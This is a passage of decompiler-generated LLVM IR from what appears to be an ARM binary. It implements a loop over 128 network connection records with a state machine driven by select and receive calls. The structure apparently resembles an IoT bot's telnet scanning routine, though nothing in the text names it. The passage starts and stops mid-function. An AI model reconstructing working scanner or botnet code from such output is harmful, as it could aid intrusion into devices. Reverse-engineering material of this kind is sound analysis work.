  store i1 %v2_10c50, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10c50, label %bb369, label %dec_label_pc_10c58

dec_label_pc_10c58:                               ; preds = %bb373
  store i32 ptrtoint (i32* @global_var_21360.183 to i32), i32* %r2.global-to-local, align 4
  %v2_10c5c = load i32, i32* @global_var_21360.183, align 4
  store i32 %v2_10c5c, i32* %r3.global-to-local, align 4
  %v1_10c60 = add i32 %v2_10c3c, 8
  %v2_10c60 = inttoptr i32 %v1_10c60 to i32*
  %v3_10c60 = load i32, i32* %v2_10c60, align 4
  store i32 %v3_10c60, i32* %r2.global-to-local, align 4
  %v2_10c64 = sub i32 %v2_10c5c, %v3_10c60
  store i32 %v2_10c64, i32* %r3.global-to-local, align 4
  %v3_10c68 = icmp uge i32 %v2_10c64, %v1_10c68
  store i1 %v3_10c68, i1* %cpsr_c.global-to-local, align 1
  %v9_10c68 = icmp eq i32 %v2_10c64, %v1_10c68
  store i1 %v9_10c68, i1* %cpsr_z.global-to-local, align 1
  %v2_10c6c = xor i1 %v3_10c68, true
  %v3_10c6c = or i1 %v9_10c68, %v2_10c6c
  br i1 %v3_10c6c, label %dec_label_pc_10bdc, label %dec_label_pc_10c70

dec_label_pc_10c70:                               ; preds = %dec_label_pc_10c58
  %v1_10c70 = add i32 %v2_10c3c, 4
  %v2_10c70 = inttoptr i32 %v1_10c70 to i32*
  %v3_10c70 = load i32, i32* %v2_10c70, align 4
  store i32 %v3_10c70, i32* %r0.global-to-local, align 4
  %v1_10c74 = call i32 @function_1314c(i32 %v3_10c70)
  store i32 %v1_10c74, i32* %r0.global-to-local, align 4
  %v0_10c78 = load i32, i32* @r4, align 4
  %v1_10c78 = add i32 %v0_10c78, 12
  %v2_10c78 = inttoptr i32 %v1_10c78 to i32*
  %v3_10c78 = load i32, i32* %v2_10c78, align 4
  store i32 %v3_10c78, i32* %r3.global-to-local, align 4
  %v2_10c7c = icmp ugt i32 %v3_10c78, 1
  store i1 %v2_10c7c, i1* %cpsr_c.global-to-local, align 1
  %v7_10c7c = icmp eq i32 %v3_10c78, 2
  store i1 %v7_10c7c, i1* %cpsr_z.global-to-local, align 1
  %v2_10c80 = xor i1 %v2_10c7c, true
  %v3_10c80 = or i1 %v7_10c7c, %v2_10c80
  br i1 %v3_10c80, label %bb374, label %.thread267

.thread267:                                       ; preds = %dec_label_pc_10c70
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_10c88264268 = add i32 %v0_10c78, 4
  %v3_10c88265269 = inttoptr i32 %v2_10c88264268 to i32*
  store i32 -1, i32* %v3_10c88265269, align 4
  br label %bb375

bb374:                                            ; preds = %dec_label_pc_10c70
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_10c88261 = add i32 %v0_10c78, 4
  %v3_10c88262 = inttoptr i32 %v2_10c88261 to i32*
  store i32 -1, i32* %v3_10c88262, align 4
  %v4_10c8c = load i32, i32* %r3.global-to-local, align 4
  %v5_10c8c = load i32, i32* @r4, align 4
  %v6_10c8c = add i32 %v5_10c8c, 12
  %v7_10c8c = inttoptr i32 %v6_10c8c to i32*
  store i32 %v4_10c8c, i32* %v7_10c8c, align 4
  %v4_10c90 = load i32, i32* %r3.global-to-local, align 4
  %v5_10c90 = trunc i32 %v4_10c90 to i8
  %v6_10c90 = load i32, i32* @r4, align 4
  %v7_10c90 = add i32 %v6_10c90, 284
  %v8_10c90 = inttoptr i32 %v7_10c90 to i8*
  store i8 %v5_10c90, i8* %v8_10c90, align 1
  %v0_10c94.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  %v1_10c94.pre = load i1, i1* %cpsr_c.global-to-local, align 1
  br label %bb375

bb375:                                            ; preds = %.thread267, %bb374
  %v1_10c94 = phi i1 [ %v1_10c94.pre, %bb374 ], [ %v2_10c7c, %.thread267 ]
  %v0_10c94 = phi i1 [ %v0_10c94.pre, %bb374 ], [ false, %.thread267 ]
  %v2_10c94 = xor i1 %v1_10c94, true
  %v3_10c94 = or i1 %v0_10c94, %v2_10c94
  br i1 %v3_10c94, label %bb369, label %dec_label_pc_10c98

dec_label_pc_10c98:                               ; preds = %bb375
  %v0_10c98 = load i32, i32* @r4, align 4
  %v1_10c98 = add i32 %v0_10c98, 284
  %v2_10c98 = inttoptr i32 %v1_10c98 to i8*
  %v3_10c98 = load i8, i8* %v2_10c98, align 1
  %v4_10c98 = zext i8 %v3_10c98 to i32
  %v1_10c9c = add nuw nsw i32 %v4_10c98, 1
  %v1_10ca0 = urem i32 %v1_10c9c, 256
  store i32 %v1_10ca0, i32* %r3.global-to-local, align 4
  %v2_10ca4 = icmp ugt i32 %v1_10ca0, 9
  store i1 %v2_10ca4, i1* %cpsr_c.global-to-local, align 1
  %v7_10ca4 = icmp eq i32 %v1_10ca0, 10
  store i1 %v7_10ca4, i1* %cpsr_z.global-to-local, align 1
  %v1_10ca8 = trunc i32 %v1_10c9c to i8
  store i8 %v1_10ca8, i8* %v2_10c98, align 1
  %v0_10cac = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_10cac, label %.thread55, label %dec_label_pc_10cbc

.thread55:                                        ; preds = %dec_label_pc_10c98
  %v1_10cac = load i32, i32* %r3.global-to-local, align 4
  %v2_10cac = add i32 %v1_10cac, -10
  store i32 %v2_10cac, i32* %r3.global-to-local, align 4
  %v2_10cb0 = load i32, i32* @r4, align 4
  %v3_10cb0 = add i32 %v2_10cb0, 12
  %v4_10cb0 = inttoptr i32 %v3_10cb0 to i32*
  store i32 %v2_10cac, i32* %v4_10cb0, align 4
  %v1_10cb4 = load i32, i32* %r3.global-to-local, align 4
  %v2_10cb4 = trunc i32 %v1_10cb4 to i8
  %v3_10cb4 = load i32, i32* @r4, align 4
  %v4_10cb4 = add i32 %v3_10cb4, 284
  %v5_10cb4 = inttoptr i32 %v4_10cb4 to i8*
  store i8 %v2_10cb4, i8* %v5_10cb4, align 1
  %v0_10cb8.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_10cb8.pr.pr, label %bb369, label %dec_label_pc_10cbc

dec_label_pc_10cbc:                               ; preds = %dec_label_pc_10c98, %.thread55
  %v0_10cbc = load i32, i32* @r4, align 4
  store i32 %v0_10cbc, i32* @r0, align 4
  %v0_10cc0 = call i32 @function_ff34()
  store i32 %v0_10cc0, i32* %r0.global-to-local, align 4
  br label %bb369

dec_label_pc_10cc8:                               ; preds = %bb369
  store i32 0, i32* @r4, align 4
  store i32 1, i32* %stack_var_-68, align 4
  %v0_10cd4 = load i32, i32* @r5, align 4
  %v1_10cd4 = load i32, i32* @r6, align 4
  %v3_10cd4 = icmp uge i32 %v0_10cd4, %v1_10cd4
  store i1 %v3_10cd4, i1* %cpsr_c.global-to-local, align 1
  %v9_10cd4 = icmp eq i32 %v0_10cd4, %v1_10cd4
  store i1 %v9_10cd4, i1* %cpsr_z.global-to-local, align 1
  %v5_10cd8 = icmp slt i32 %v0_10cd4, %v1_10cd4
  %storemerge126 = select i1 %v5_10cd8, i32 %v1_10cd4, i32 %v0_10cd4
  %v2_10cec = ptrtoint i32* %stack_var_-68 to i32
  store i32 %v2_10cec, i32* %ip.global-to-local, align 4
  %v2_10cf0 = ptrtoint i32* %stack_var_-224 to i32
  store i32 %v2_10cf0, i32* %r1.global-to-local, align 4
  %v2_10cf4 = ptrtoint i32* %stack_var_-352 to i32
  store i32 %v2_10cf4, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_10cfc = add i32 %storemerge126, 1
  store i32 %v1_10cfc, i32* %r0.global-to-local, align 4
  %v5_10d08 = call i32 @function_12e3c(i32 %v1_10cfc, i32 %v2_10cf0, i32 %v2_10cf4, i32 0, i32 %v2_10cec)
  %v0_10d0c = load i32, i32* @r4, align 4
  store i32 %v0_10d0c, i32* %r0.global-to-local, align 4
  %v1_10d10 = inttoptr i32 %v0_10d0c to i32*
  %v2_10d10 = call i32 @function_12d98(i32* %v1_10d10)
  store i32 %v2_10d10, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_21360.183 to i32), i32* @lr, align 4
  %v0_10d18 = load i32, i32* @r4, align 4
  store i32 %v0_10d18, i32* %stack_var_-52, align 4
  store i32 %v2_10d10, i32* @global_var_21360.183, align 4
  %v2_10da4 = inttoptr i32 %stack_var_-1876.0 to i32*
  %v2_11684 = ptrtoint i32* %stack_var_-45 to i32
  %v2_11698 = ptrtoint i32* %stack_var_-77 to i32
  %v2_11428 = ptrtoint i32* %stack_var_-60 to i32
  %v2_117c8 = ptrtoint i32* %stack_var_-104 to i32
  %v2_119f4 = ptrtoint i32* %stack_var_-96 to i32
  %v2_11a20 = ptrtoint i32* %stack_var_-56 to i32
  %v2_11a4c = ptrtoint i32* %stack_var_-42 to i32
  br label %dec_label_pc_10d20

dec_label_pc_10d20:                               ; preds = %dec_label_pc_10e90, %dec_label_pc_10cc8
  %v0_10d2c = phi i32 [ %v1_10e94, %dec_label_pc_10e90 ], [ %v0_10d18, %dec_label_pc_10cc8 ]
  store i32 ptrtoint (i32* @global_var_233b0.194 to i32), i32* %r0.global-to-local, align 4
  %v3_10d24 = mul i32 %v0_10d2c, 256
  store i32 %v3_10d24, i32* %r3.global-to-local, align 4
  %v2_10d28 = load i32, i32* @global_var_233b0.194, align 4
  store i32 %v2_10d28, i32* %r1.global-to-local, align 4
  %v2_10d30 = mul i32 %v0_10d2c, 288
  store i32 %v2_10d30, i32* %r2.global-to-local, align 4
  %v2_10d34 = add i32 %v2_10d28, %v2_10d30
  store i32 %v2_10d34, i32* @r6, align 4
  %v1_10d38 = add i32 %v2_10d34, 4
  %v2_10d38 = inttoptr i32 %v1_10d38 to i32*
  %v3_10d38 = load i32, i32* %v2_10d38, align 4
  store i32 %v3_10d38, i32* %r0.global-to-local, align 4
  %v2_10d3c = icmp eq i32 %v3_10d38, -1
  store i1 %v2_10d3c, i1* %cpsr_c.global-to-local, align 1
  %v7_10d3c = icmp eq i32 %v3_10d38, -1
  store i1 %v7_10d3c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10d3c, label %dec_label_pc_10e90, label %dec_label_pc_10d44

dec_label_pc_10d44:                               ; preds = %dec_label_pc_10d20
  %v3_10d44 = udiv i32 %v3_10d38, 32
  store i32 %v2_11af0, i32* %r1.global-to-local, align 4
  %v3_10d4c = mul nuw nsw i32 %v3_10d44, 4
  store i32 %v3_10d4c, i32* @ip, align 4
  %v2_10d50 = add i32 %v3_10d4c, %v2_11af0
  store i32 %v2_10d50, i32* %r2.global-to-local, align 4
  %v1_10d54 = add i32 %v2_10d50, -312
  %v2_10d54 = inttoptr i32 %v1_10d54 to i32*
  %v3_10d54 = load i32, i32* %v2_10d54, align 4
  %v1_10d58 = urem i32 %v3_10d38, 32
  store i32 %v1_10d58, i32* %r1.global-to-local, align 4
  %v2_10d5c = add nsw i32 %v1_10d58, -1
  %v3_10d5c = shl i32 1, %v2_10d5c
  %v4_10d5c = and i32 %v3_10d54, %v3_10d5c
  %v5_10d5c = icmp ne i32 %v4_10d5c, 0
  store i1 %v5_10d5c, i1* %cpsr_c.global-to-local, align 1
  %v6_10d5c = lshr i32 %v3_10d54, %v1_10d58
  store i32 %v6_10d5c, i32* %r3.global-to-local, align 4
  %v1_10d60 = urem i32 %v6_10d5c, 2
  %v2_10d60 = icmp eq i32 %v1_10d60, 0
  store i1 %v2_10d60, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10d60, label %dec_label_pc_10d68, label %dec_label_pc_118b0

dec_label_pc_10d68:                               ; preds = %dec_label_pc_10d44, %dec_label_pc_1195c
  %v1_10d74 = phi i32 [ %v1_10d58, %dec_label_pc_10d44 ], [ %v1_10d74.pre, %dec_label_pc_1195c ]
  %v0_10d6c = phi i32 [ %v3_10d4c, %dec_label_pc_10d44 ], [ %v0_10d6c.pre, %dec_label_pc_1195c ]
  store i32 %v2_11af0, i32* @lr, align 4
  %v2_10d6c = add i32 %v0_10d6c, %v2_11af0
  store i32 %v2_10d6c, i32* %r2.global-to-local, align 4
  %v1_10d70 = add i32 %v2_10d6c, -184
  %v2_10d70 = inttoptr i32 %v1_10d70 to i32*
  %v3_10d70 = load i32, i32* %v2_10d70, align 4
  %v2_10d74 = add i32 %v1_10d74, -1
  %v3_10d74 = shl i32 1, %v2_10d74
  %v4_10d74 = and i32 %v3_10d70, %v3_10d74
  %v5_10d74 = icmp ne i32 %v4_10d74, 0
  store i1 %v5_10d74, i1* %cpsr_c.global-to-local, align 1
  %v6_10d74 = lshr i32 %v3_10d70, %v1_10d74
  store i32 %v6_10d74, i32* %r3.global-to-local, align 4
  %v1_10d78 = urem i32 %v6_10d74, 2
  %v2_10d78 = icmp eq i32 %v1_10d78, 0
  store i1 %v2_10d78, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10d78, label %dec_label_pc_10e90, label %dec_label_pc_10d80.preheader

dec_label_pc_10d80.preheader:                     ; preds = %dec_label_pc_10d68
  %v0_10d80149 = load i32, i32* @r6, align 4
  %v1_10d80150 = add i32 %v0_10d80149, 12
  %v2_10d80151 = inttoptr i32 %v1_10d80150 to i32*
  %v3_10d80152 = load i32, i32* %v2_10d80151, align 4
  store i32 %v3_10d80152, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10d84148154 = icmp eq i32 %v3_10d80152, 0
  store i1 %v2_10d84148154, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10d84148154, label %dec_label_pc_10e90, label %dec_label_pc_10d8c.lr.ph

dec_label_pc_10d80.loopexit:                      ; preds = %dec_label_pc_1176c, %dec_label_pc_11588, %dec_label_pc_11510, %dec_label_pc_11ac0
  %v0_10d80 = load i32, i32* @r6, align 4
  %v1_10d80 = add i32 %v0_10d80, 12
  %v2_10d80 = inttoptr i32 %v1_10d80 to i32*
  %v3_10d80 = load i32, i32* %v2_10d80, align 4
  store i32 %v3_10d80, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10d84148 = icmp eq i32 %v3_10d80, 0
  store i1 %v2_10d84148, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10d84148, label %dec_label_pc_10e90, label %dec_label_pc_10d8c.lr.ph

dec_label_pc_10d8c.lr.ph:                         ; preds = %dec_label_pc_10d80.preheader, %dec_label_pc_10d80.loopexit
  %v0_10d8c180 = phi i32 [ %v0_10d80, %dec_label_pc_10d80.loopexit ], [ %v0_10d80149, %dec_label_pc_10d80.preheader ]
  br label %dec_label_pc_10d8c

dec_label_pc_10d84thread-pre-split.thread:        ; preds = %dec_label_pc_10f48, %dec_label_pc_1101c, %dec_label_pc_110f0, %dec_label_pc_112c8, %dec_label_pc_1139c
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_10d8c

dec_label_pc_10d84thread-pre-split.thread512:     ; preds = %dec_label_pc_11400, %dec_label_pc_11258, %dec_label_pc_11080, %dec_label_pc_1132c, %dec_label_pc_10fac
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_10d8c

dec_label_pc_10d84thread-pre-split:               ; preds = %dec_label_pc_10e04
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10d84 = icmp eq i32 %v3_10e04, 0
  store i1 %v2_10d84, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10d84, label %dec_label_pc_10e90, label %dec_label_pc_10d8c

dec_label_pc_10d8c:                               ; preds = %dec_label_pc_10d84thread-pre-split.thread, %dec_label_pc_10d84thread-pre-split, %dec_label_pc_10d84thread-pre-split.thread512, %dec_label_pc_10d8c.lr.ph
  %v0_1185c = phi i32 [ %v0_10d8c180, %dec_label_pc_10d8c.lr.ph ], [ %v0_10e04, %dec_label_pc_10d84thread-pre-split.thread512 ], [ %v0_10e04, %dec_label_pc_10d84thread-pre-split ], [ %v0_10e04, %dec_label_pc_10d84thread-pre-split.thread ]
  %v1_10d8c = add i32 %v0_1185c, 24
  %v2_10d8c = inttoptr i32 %v1_10d8c to i32*
  %v3_10d8c = load i32, i32* %v2_10d8c, align 4
  store i32 %v3_10d8c, i32* @r3, align 4
  %v2_10d90 = icmp ugt i32 %v3_10d8c, 255
  store i1 %v2_10d90, i1* %cpsr_c.global-to-local, align 1
  %v7_10d90 = icmp eq i32 %v3_10d8c, 256
  store i1 %v7_10d90, i1* %cpsr_z.global-to-local, align 1
  %.pre = add i32 %v0_1185c, 28
  store i32 %.pre, i32* @fp, align 4
  br i1 %v7_10d90, label %dec_label_pc_1185c, label %dec_label_pc_10d9c

dec_label_pc_10d9c:                               ; preds = %dec_label_pc_10d8c, %dec_label_pc_1185c
  store i32 %stack_var_-1876.0, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  store i32 0, i32* %v2_10da4, align 4
  %v0_10da8 = load i32, i32* @r6, align 4
  %v1_10da8 = add i32 %v0_10da8, 24
  %v2_10da8 = inttoptr i32 %v1_10da8 to i32*
  %v3_10da8 = load i32, i32* %v2_10da8, align 4
  store i32 %v3_10da8, i32* %r2.global-to-local, align 4
  %v0_10dac = load i32, i32* @fp, align 4
  %v2_10dac = add i32 %v0_10dac, %v3_10da8
  store i32 %v2_10dac, i32* @r4, align 4
  %v1_10db0 = add i32 %v0_10da8, 4
  %v2_10db0 = inttoptr i32 %v1_10db0 to i32*
  %v3_10db0 = load i32, i32* %v2_10db0, align 4
  store i32 %v3_10db0, i32* %r0.global-to-local, align 4
  %v1_10db4 = sub i32 256, %v3_10da8
  store i32 %v1_10db4, i32* %r2.global-to-local, align 4
  store i32 %v2_10dac, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_10dc0 = call i32 @function_13810(i32 %v3_10db0, i32 %v2_10dac, i32 %v1_10db4, i32 16384)
  store i32 %v4_10dc0, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10dc4 = icmp eq i32 %v4_10dc0, 0
  store i1 %v2_10dc4, i1* %cpsr_z.global-to-local, align 1
  %tmp376 = icmp slt i32 %v4_10dc0, 1
  br i1 %tmp376, label %dec_label_pc_10e3c, label %dec_label_pc_10dcc

dec_label_pc_10dcc:                               ; preds = %dec_label_pc_10d9c
  %v0_10dcc = load i32, i32* @r5, align 4
  store i32 %v0_10dcc, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_10dd0

dec_label_pc_10dd0:                               ; preds = %.thread62, %dec_label_pc_10dcc
  %v3_10ddc = phi i32 [ %v1_10de0, %.thread62 ], [ %v0_10dcc, %dec_label_pc_10dcc ]
  %v1_10dd0 = load i32, i32* @r4, align 4
  %v2_10dd0 = add i32 %v1_10dd0, %v3_10ddc
  %v3_10dd0 = inttoptr i32 %v2_10dd0 to i8*
  %v4_10dd0 = load i8, i8* %v3_10dd0, align 1
  %v6_10dd0 = zext i8 %v4_10dd0 to i32
  store i32 %v6_10dd0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10dd4 = icmp eq i8 %v4_10dd0, 0
  store i1 %v2_10dd4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10dd4, label %bb377, label %.thread62

bb377:                                            ; preds = %dec_label_pc_10dd0
  %v2_10dd8 = add nuw nsw i32 %v6_10dd0, 65
  store i32 %v2_10dd8, i32* %r3.global-to-local, align 4
  %v2_10ddc = trunc i32 %v2_10dd8 to i8
  store i8 %v2_10ddc, i8* %v3_10dd0, align 1
  %v0_10de0.pre = load i32, i32* %r2.global-to-local, align 4
  br label %.thread62

.thread62:                                        ; preds = %dec_label_pc_10dd0, %bb377
  %v0_10de0 = phi i32 [ %v3_10ddc, %dec_label_pc_10dd0 ], [ %v0_10de0.pre, %bb377 ]
  %v1_10de0 = add i32 %v0_10de0, 1
  store i32 %v1_10de0, i32* %r2.global-to-local, align 4
  %v3_10de4 = icmp uge i32 %v1_10de0, %v4_10dc0
  store i1 %v3_10de4, i1* %cpsr_c.global-to-local, align 1
  %v9_10de4 = icmp eq i32 %v1_10de0, %v4_10dc0
  store i1 %v9_10de4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_10de4, label %dec_label_pc_10dec, label %dec_label_pc_10dd0

dec_label_pc_10dec:                               ; preds = %.thread62, %dec_label_pc_10e40
  store i32 ptrtoint (i32* @global_var_21360.183 to i32), i32* @ip, align 4
  %v0_10df0 = load i32, i32* @r6, align 4
  %v1_10df0 = add i32 %v0_10df0, 24
  %v2_10df0 = inttoptr i32 %v1_10df0 to i32*
  %v3_10df0 = load i32, i32* %v2_10df0, align 4
  %v2_10df4 = load i32, i32* @global_var_21360.183, align 4
  store i32 %v2_10df4, i32* %r2.global-to-local, align 4
  %v2_10df8 = add i32 %v3_10df0, %v4_10dc0
  store i32 %v2_10df8, i32* %r3.global-to-local, align 4
  store i32 %v2_10df8, i32* %v2_10df0, align 4
  %v0_10e00 = load i32, i32* %r2.global-to-local, align 4
  %v1_10e00 = load i32, i32* @r6, align 4
  %v2_10e00 = add i32 %v1_10e00, 8
  %v3_10e00 = inttoptr i32 %v2_10e00 to i32*
  store i32 %v0_10e00, i32* %v3_10e00, align 4
  br label %dec_label_pc_10e04

dec_label_pc_10e04:                               ; preds = %dec_label_pc_10f20, %dec_label_pc_10dec
  %v0_10e04 = load i32, i32* @r6, align 4
  %v1_10e04 = add i32 %v0_10e04, 12
  %v2_10e04 = inttoptr i32 %v1_10e04 to i32*
  %v3_10e04 = load i32, i32* %v2_10e04, align 4
  store i32 %v3_10e04, i32* %r0.global-to-local, align 4
  %v1_10e08 = add i32 %v3_10e04, -2
  store i32 %v1_10e08, i32* @r3, align 4
  %v7_10e0c = icmp eq i32 %v1_10e08, 8
  store i1 %v7_10e0c, i1* %cpsr_z.global-to-local, align 1
  %v5_10e10 = and i32 %v1_10e08, 1073741824
  %v6_10e10 = icmp ne i32 %v5_10e10, 0
  store i1 %v6_10e10, i1* %cpsr_c.global-to-local, align 1
  switch i32 %v3_10e04, label %dec_label_pc_10d84thread-pre-split [
    i32 2, label %dec_label_pc_115b0
    i32 3, label %dec_label_pc_11470
    i32 4, label %dec_label_pc_1151c
    i32 5, label %dec_label_pc_1139c
    i32 6, label %dec_label_pc_110f0
    i32 7, label %dec_label_pc_1101c
    i32 8, label %dec_label_pc_112c8
    i32 9, label %dec_label_pc_10f48
    i32 10, label %dec_label_pc_10ea8
  ]

dec_label_pc_10e3c:                               ; preds = %dec_label_pc_10d9c
  br i1 %v2_10dc4, label %dec_label_pc_11b14, label %dec_label_pc_10e40

dec_label_pc_10e40:                               ; preds = %dec_label_pc_10e3c
  %v3_10e40 = icmp eq i32 %v4_10dc0, -1
  store i1 %v3_10e40, i1* %cpsr_c.global-to-local, align 1
  %v8_10e40 = icmp eq i32 %v4_10dc0, -1
  store i1 %v8_10e40, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_10e40, label %dec_label_pc_10e48, label %dec_label_pc_10dec

dec_label_pc_10e48:                               ; preds = %dec_label_pc_10e40
  store i32 %stack_var_-1876.0, i32* %r2.global-to-local, align 4
  %v2_10e4c = load i32, i32* %v2_10da4, align 4
  store i32 %v2_10e4c, i32* %r3.global-to-local, align 4
  %v2_10e50 = icmp ugt i32 %v2_10e4c, 10
  store i1 %v2_10e50, i1* %cpsr_c.global-to-local, align 1
  %v7_10e50 = icmp eq i32 %v2_10e4c, 11
  store i1 %v7_10e50, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10e50, label %dec_label_pc_10e90, label %dec_label_pc_10e58

dec_label_pc_10e58:                               ; preds = %dec_label_pc_10e48, %dec_label_pc_11b14
  %v0_10e58 = load i32, i32* @r6, align 4
  %v1_10e58 = add i32 %v0_10e58, 4
  %v2_10e58 = inttoptr i32 %v1_10e58 to i32*
  %v3_10e58 = load i32, i32* %v2_10e58, align 4
  store i32 %v3_10e58, i32* %r0.global-to-local, align 4
  %v1_10e5c = call i32 @function_1314c(i32 %v3_10e58)
  store i32 %v1_10e5c, i32* %r0.global-to-local, align 4
  %v0_10e60 = load i32, i32* @r6, align 4
  %v1_10e60 = add i32 %v0_10e60, 284
  %v2_10e60 = inttoptr i32 %v1_10e60 to i8*
  %v3_10e60 = load i8, i8* %v2_10e60, align 1
  %v4_10e60 = zext i8 %v3_10e60 to i32
  %v1_10e64 = add nuw nsw i32 %v4_10e60, 1
  %v1_10e68 = urem i32 %v1_10e64, 256
  store i32 %v1_10e68, i32* %r3.global-to-local, align 4
  %v2_10e6c = icmp ugt i32 %v1_10e68, 8
  store i1 %v2_10e6c, i1* %cpsr_c.global-to-local, align 1
  %v7_10e6c = icmp eq i32 %v1_10e68, 9
  store i1 %v7_10e6c, i1* %cpsr_z.global-to-local, align 1
  %v1_10e70 = trunc i32 %v1_10e64 to i8
  store i8 %v1_10e70, i8* %v2_10e60, align 1
  store i32 -1, i32* %r2.global-to-local, align 4
  %v0_10e78 = load i1, i1* %cpsr_c.global-to-local, align 1
  %v1_10e78 = load i1, i1* %cpsr_z.global-to-local, align 1
  %v2_10e78 = xor i1 %v1_10e78, true
  %v3_10e78 = and i1 %v0_10e78, %v2_10e78
  br i1 %v3_10e78, label %bb378, label %.thread281

.thread281:                                       ; preds = %dec_label_pc_10e58
  %v1_10e7c277282 = load i32, i32* @r6, align 4
  %v2_10e7c278283 = add i32 %v1_10e7c277282, 4
  %v3_10e7c279284 = inttoptr i32 %v2_10e7c278283 to i32*
  store i32 -1, i32* %v3_10e7c279284, align 4
  br label %bb379

bb378:                                            ; preds = %dec_label_pc_10e58
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_10e7c273 = load i32, i32* @r6, align 4
  %v2_10e7c274 = add i32 %v1_10e7c273, 4
  %v3_10e7c275 = inttoptr i32 %v2_10e7c274 to i32*
  store i32 -1, i32* %v3_10e7c275, align 4
  %v4_10e80 = load i32, i32* %r3.global-to-local, align 4
  %v5_10e80 = load i32, i32* @r6, align 4
  %v6_10e80 = add i32 %v5_10e80, 12
  %v7_10e80 = inttoptr i32 %v6_10e80 to i32*
  store i32 %v4_10e80, i32* %v7_10e80, align 4
  %v4_10e84 = load i32, i32* %r3.global-to-local, align 4
  %v5_10e84 = trunc i32 %v4_10e84 to i8
  %v6_10e84 = load i32, i32* @r6, align 4
  %v7_10e84 = add i32 %v6_10e84, 284
  %v8_10e84 = inttoptr i32 %v7_10e84 to i8*
  store i8 %v5_10e84, i8* %v8_10e84, align 1
  %v0_10e88.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  %v1_10e88.pre = load i1, i1* %cpsr_c.global-to-local, align 1
  br label %bb379

bb379:                                            ; preds = %.thread281, %bb378
  %v1_10e8c = phi i1 [ %v1_10e88.pre, %bb378 ], [ %v0_10e78, %.thread281 ]
  %v0_10e8c = phi i1 [ %v0_10e88.pre, %bb378 ], [ %v1_10e78, %.thread281 ]
  %v2_10e88 = xor i1 %v1_10e8c, true
  %v3_10e88 = or i1 %v0_10e8c, %v2_10e88
  br i1 %v3_10e88, label %bb380, label %bb381

bb380:                                            ; preds = %bb379
  %v4_10e88 = load i32, i32* @r6, align 4
  store i32 %v4_10e88, i32* %r0.global-to-local, align 4
  br label %bb381

bb381:                                            ; preds = %bb379, %bb380
  store i32 69264, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_10e88, i32 ptrtoint (i32* @global_var_ff34.312 to i32))
  br label %dec_label_pc_10e90

dec_label_pc_10e90:                               ; preds = %dec_label_pc_10d80.loopexit, %dec_label_pc_10d84thread-pre-split, %dec_label_pc_10d80.preheader, %dec_label_pc_10e48, %dec_label_pc_10d68, %dec_label_pc_10d20, %dec_label_pc_1197c, %bb381
  %v3_10e90 = load i32, i32* %stack_var_-52, align 4
  store i32 %v3_10e90, i32* %r3.global-to-local, align 4
  %v1_10e94 = add i32 %v3_10e90, 1
  store i32 %v1_10e94, i32* @r4, align 4
  %v2_10e98 = icmp ugt i32 %v1_10e94, 126
  store i1 %v2_10e98, i1* %cpsr_c.global-to-local, align 1
  %v7_10e98 = icmp eq i32 %v1_10e94, 127
  store i1 %v7_10e98, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_10e94, i32* %stack_var_-52, align 4
  %v7_10ea0 = icmp slt i32 %v1_10e94, 128
  br i1 %v7_10ea0, label %dec_label_pc_10d20, label %dec_label_pc_1073c

dec_label_pc_10ea8:                               ; preds = %dec_label_pc_10e04
  store i32 26, i32* %r0.global-to-local, align 4
  %v1_10eac = call i32 @function_11be8(i32 26)
  store i32 %v2_11428, i32* %r1.global-to-local, align 4
  store i32 26, i32* %r0.global-to-local, align 4
  %v3_10ebc = call i32 @function_11b24(i32 26, i32* nonnull %stack_var_-60)
  %v3_10ec0 = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_10ebc, i32* %r2.global-to-local, align 4
  %v1_10ec8 = add i32 %v3_10ec0, -1
  store i32 %v1_10ec8, i32* %r3.global-to-local, align 4
  %v0_10ecc = load i32, i32* @fp, align 4
  store i32 %v0_10ecc, i32* %r0.global-to-local, align 4
  %v0_10ed0 = load i32, i32* @r6, align 4
  %v1_10ed0 = add i32 %v0_10ed0, 24
  %v2_10ed0 = inttoptr i32 %v1_10ed0 to i32*
  %v3_10ed0 = load i32, i32* %v2_10ed0, align 4
  store i32 %v3_10ed0, i32* %r1.global-to-local, align 4
  %v4_10ed4 = call i32 @function_12538(i32 %v0_10ecc, i32 %v3_10ed0, i32 %v3_10ebc, i32 %v1_10ec8)
  %v2_10ed8 = icmp eq i32 %v4_10ed4, -1
